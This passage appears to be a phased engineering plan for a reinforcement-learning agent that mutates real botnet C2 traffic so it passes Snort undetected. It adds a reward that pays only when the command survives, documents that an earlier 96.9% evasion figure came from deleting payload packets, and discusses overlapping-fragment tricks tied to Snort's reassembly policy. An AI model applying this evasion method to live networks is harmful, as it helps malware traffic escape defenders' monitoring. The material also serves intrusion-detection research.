Commit: `test(env): assert DROP is gone and overlap preserves the command`

---

## Phase 4 — Semantics-constrained reward

### Task 4.1 — Failing test: a destructive evasion must not be paid

Append to `tests/test_payload_actions.py`:

```python
def test_reward_rejects_destructive_evasion():
    """alerts == 0 alone is not enough; the command must survive."""
    from real_packet_env import semantics_reward

    # evaded AND command intact -> full bonus
    assert semantics_reward(alerts=0, semantics_ok=True) > 0
    # evaded but the command was destroyed -> no bonus, penalised
    assert semantics_reward(alerts=0, semantics_ok=False) <= 0
    # detected -> never paid
    assert semantics_reward(alerts=3, semantics_ok=True) < 0
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_payload_actions.py::test_reward_rejects_destructive_evasion -q
```
Expected: **FAILS** — `ImportError: cannot import name 'semantics_reward'`

### Task 4.2 — Implement the constrained reward

In `ai_agent/real_packet_env.py`, add next to `coverage_reward`:

```python
def semantics_reward(alerts: int, semantics_ok: bool) -> float:
    """Terminal reward that only pays for evasions that keep the C2 command.

    `alerts == 0` alone is satisfiable by deleting the traffic (measured: the
    DROP-heavy policy scored 96.9% that way).  Gating on the semantics oracle
    makes destruction strictly worse than not acting.
    """
    if alerts == 0:
        return REWARD_EVASION_BONUS if semantics_ok else -REWARD_EVASION_BONUS
    return -float(alerts) - (0.0 if semantics_ok else REWARD_EVASION_BONUS)
```

Track the original payload so the oracle has something to compare against. In
`reset()`, after `self._cur_packets = [p.copy() for p in packets]`, add:

```python
        # Snapshot the command we must not destroy.  Fragmentation replaces
        # packets, so the oracle compares against the pre-mutation payload.
        self._original_payloads = [bytes(p[Raw].load) for p in self._cur_packets
                                   if Raw in p] if any(Raw in p for p in self._cur_packets) else []
```

and in `__init__`, next to `self._corrupted`:

```python
        self._original_payloads: List[bytes] = []
        self._ambiguity_ops = 0
```

Replace the terminal reward block in `step()`:

```python
            detected = alerts > 0
            pay = payload_indices(self._cur_packets)
            reward = coverage_reward(alerts, len(pay),
                                     sum(1 for i in pay if i in self._corrupted))
```

with:

```python
            detected = alerts > 0
            ok = self._semantics_ok()
            reward = semantics_reward(alerts, ok)
            info["semantics_ok"] = ok
```

and add the oracle method after `assert_model_compatible`:

```python
    def _semantics_ok(self) -> bool:
        """True when every original payload is still reconstructible.

        Reconstructible means: some standard endpoint reassembly policy recovers
        the exact original bytes from what is currently on the wire.
        """
        from c2_semantics import Fragment, semantics_preserved
        from scapy.all import Raw
        if not self._original_payloads:
            return True
        current = [bytes(p[Raw].load) for p in self._cur_packets if Raw in p]
        if not current:
            return False                      # everything was deleted
        joined = b"".join(current)
        for original in self._original_payloads:
            if original not in joined:
                # Not contiguous any more: rebuild a fragment view and let the
                # oracle decide, so a legitimate split still counts as intact.
                frags = [Fragment(offset=0, data=joined)]
                if not semantics_preserved(original, frags):
                    return False
        return True
```

Run the suite:
```bash
cd /root/.hermes/c2-evasion-rl && make test
```
Expected: all pass.

Commit: `feat(env): gate the reward on C2 command preservation`

### Task 4.3 — Wire the constraint into replica training

In `ai_agent/train_replica_agent.py`, import the oracle and use the same gate.
Add to the imports:

```python
from c2_semantics import Fragment, semantics_preserved
```

In `ReplicaPacketEnv.step`, replace the reward computation with:

```python
        if terminated:
            alerts = self.replica.alert_count(self._cur)
            self._last_alerts = alerts
            from scapy.all import Raw
            current = [bytes(p[Raw].load) for p in self._cur if Raw in p]
            ok = True
            for original in self._original_payloads:
                if original not in b"".join(current):
                    ok = False
                    break
            reward = (-float(alerts) + (REWARD_EVASION_BONUS if alerts == 0 else 0.0)
                      if ok else -float(alerts) - REWARD_EVASION_BONUS)
            info = {"detected": alerts > 0, "evaded": alerts == 0,
                    "alerts": alerts, "semantics_ok": ok}
```

and add `self._original_payloads = [bytes(p[Raw].load) for p in self._cur if Raw in p]`
at the end of `reset()`.

Retrain both captures:
```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python ai_agent/train_replica_agent.py \
  --capture botnet-capture-20110811-neris --dataset stratosphere \
  --flows 64 --timesteps 20000 --out /tmp/ppo_sem_neris.zip \
  --report /tmp/report_sem_neris.json
```
Expected: `mean_coverage` no longer 0.0, and `top_packet_indices` should spread
beyond a single index (the DROP collapse was `[{2, 768}]`).

Commit: `feat(train): enforce command preservation in replica training`

---

## Phase 5 — Report the corrected numbers

### Task 5.1 — Semantics-aware acceptance gate

Extend `snort_validation/validate_real_snort_agent.py` with a semantics arm.
Add after the `corrupt_all` arm:

```python
    # destructive upper bound, for contrast: DROP every payload packet
    dropped = []
    for i, (_k, pkts) in enumerate(flows):
        keep = [p for p in pkts if not (Raw in p)]
        dropped.append((keep if keep else pkts, i))
    arms["drop_all_DESTRUCTIVE"] = dropped
```

and in the report add:

```python
    res["note_destructive_arm"] = (
        "drop_all_DESTRUCTIVE removes the payload-bearing packets. It is NOT an "
        "evasion: the C2 command never arrives. Shown only to contrast with the "
        "semantics-preserving arms.")
```

Run:
```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python snort_validation/validate_real_snort_agent.py --flows 24
```
Expected: the destructive arm reports high "evasion" while the agent's figure is
the honest one, and the contrast is explicit in the JSON.

Commit: `test(validation): contrast destructive arm with semantics-preserving evasion`

### Task 5.2 — Correct the record

Add to `README.md` limitations:

```
- **Evasion must preserve the command.** `alerts == 0` alone is satisfiable by
  deleting the payload-bearing packets. Measured: a DROP-heavy policy scored
  96.9% evasion against real Snort while destroying the C2 command (372 of 384
  actions were DROP, mean payload coverage 0.0). Evasion figures are reported
  only for mutations that leave the original payload reconstructible by at least
  one standard endpoint reassembly policy (`snort_validation/c2_semantics.py`).
- **Snort is configured `policy first`** (`frag3_engine`, `stream5_tcp` in
  `snort_validation/et_open_c2/snort_et_c2.conf`). Overlapping-fragment evasion
  depends on this setting; a `policy last` defender would behave differently.
  That dependence is the finding, not a hidden assumption.
```

Commit: `docs(readme): define evasion as command-preserving and record the frag policy`

---

## Tests / validation

| Gate | Command | Pass condition |
|---|---|---|
| Oracle | `pytest tests/test_c2_semantics.py -q` | 5 passed |
| Fragments | `pytest tests/test_fragment_ops.py -q` | 4 passed |
| Action space | `pytest tests/test_payload_actions.py -q` | DROP gone, overlap preserves command |
| Reward | `pytest tests/test_payload_actions.py::test_reward_rejects_destructive_evasion -q` | destructive evasion scores ≤ 0 |
| Full suite | `make test` | all pass (33 + new) |
| **GO/NO-GO** | `probe_overlap_evasion.py --capture botnet-capture-20110819-bot --dataset ctu13 --flow 0` | `VERDICT: REAL EVASION` |
| HTTP route | `probe_overlap_evasion.py --capture botnet-capture-20110811-neris --dataset stratosphere --flow 0` | same |
| Honest number | `validate_real_snort_agent.py --flows 24` | agent beats control AND semantics_ok |

## Risks, tradeoffs, and open questions

**Risks**

- **`detect_anomalies` may sink this.** `frag3_engine: policy first detect_anomalies`
  tells Snort to flag overlapping fragments. If the overlap produces an anomaly
  alert, evasion fails for a reason unrelated to the rules. Phase 2 measures
  exactly this and names it in the output; if it fires, the next measured variant
  is a conf without `detect_anomalies`, reported as a separate configuration
  rather than silently swapped.
- **`stream5_tcp: policy first` is about TCP segment overlap, not IP fragments.**
  The UDP/DHT target exercises `frag3`; the TCP/HTTP target on Neris exercises
  `stream5`. Both are set to `first`, but they are separate mechanisms and the
  probe must be run on both captures — one passing does not imply the other.
- **Snort 2.9 may normalise fragments before rules run.** If frag3 fully
  reassembles and the rule engine only ever sees the `first`-policy view, the
  overlap works in our favour. If Snort instead drops or alerts on the overlap,
  it does not. Phase 2 decides this empirically.
- **`test_drop_is_not_in_the_action_space` breaks the old checkpoints.** Every
  existing model becomes incompatible, which `assert_model_compatible` will now
  report loudly. Intended.
- **The 12.5% cross-family transfer may fall further.** The Neris policy scored
  12.5% on NSIS.ay; removing DROP removes the action it was relying on. Expect the
  semantics-constrained number to be lower and that is the honest one.

**Tradeoffs**

- Constraining the reward shrinks the reachable evasion set. That is the point:
  the previous 96.9% was an artefact, and a smaller real number is worth more
  than a larger fake one.
- The oracle is deliberately generous (either policy recovering the original
  counts as intact). Tightening it to a specific endpoint policy would make the
  claim stronger but requires knowing which policy the target runs, which we do
  not.
- Fragment actions multiply packets per flow, so Snort's per-flow cost rises.
  Acceptable at probe scale; if training gets slow, cap the split offsets.

**Open questions**

1. Which reassembly policy does the *target endpoint* actually use? The oracle
   accepts either, so the claim is "evasion against a `policy first` IDS while the
   command survives under at least one standard policy". Is that strong enough, or
   must the target be pinned?
2. Should a `policy last` Snort configuration also be measured, to show the
   evasion is a configuration-dependent gap rather than a universal bypass?
3. `sid:2012533` (Virut) carries a `pcre` on 100 hex chars. Overlap can hide the
   `content:` anchors, but if the pcre alone matches on a reassembled view the
   rule still fires. Is a pcre-only-remaining case worth pursuing, or out of scope?
4. Is the `dht_ping_id` parse check the right level of semantics proof, or should
   each family get a real protocol parser before any evasion claim is published?
